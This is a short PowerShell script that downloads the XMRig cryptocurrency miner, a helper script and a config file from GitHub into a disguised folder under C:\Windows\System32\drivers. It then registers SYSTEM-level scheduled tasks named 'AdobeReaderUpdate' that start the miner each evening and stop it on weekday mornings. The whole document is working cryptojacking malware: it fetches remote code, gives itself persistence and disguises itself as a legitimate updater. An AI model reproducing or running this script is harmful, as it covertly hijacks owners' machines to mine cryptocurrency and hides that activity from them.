# Declared Values
$url = "https://github.com/diggles9991/MG/raw/master/XMR/xmrig.exe"
$url2 = "https://github.com/diggles9991/MG/raw/master/XMR/Line.ps1"
$url3 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/XMR/sinker.json"
$output = "C:\Windows\System32\drivers\en-US\etc\xmrig.exe"
$output2 = "C:\Windows\System32\drivers\en-US\etc\Line.ps1"
$output3 = "C:\Windows\System32\drivers\en-US\etc\sinker.json"
$processpath = 'C:\Windows\System32\drivers\en-US\etc\'
$processname = 'xmrig'
$processtype = '.exe'


# Create etc directory
New-Item C:\Windows\System32\drivers\en-US\etc\ -Type Directory


# Download XMRig
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)


# Download XMRig
$wc2 = New-Object System.Net.WebClient
$wc2.DownloadFile($url2, $output2)


# Update scheduled Start Task
SCHTASKS /Delete /tn "AdobeReaderUpdate" /f
SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdate" /sc Weekly /d * /st 18:00:00 /tr "powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1"


# Update scheduled End Task
# SCHTASKS /Delete /tn "AdobeReaderUpdateEnd" /f
SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdateEnd" /sc Weekly /d MON,TUE,WED,THU,FRI /st 06:00:00 /tr "powershell.exe Stop-Process -Name $processname"
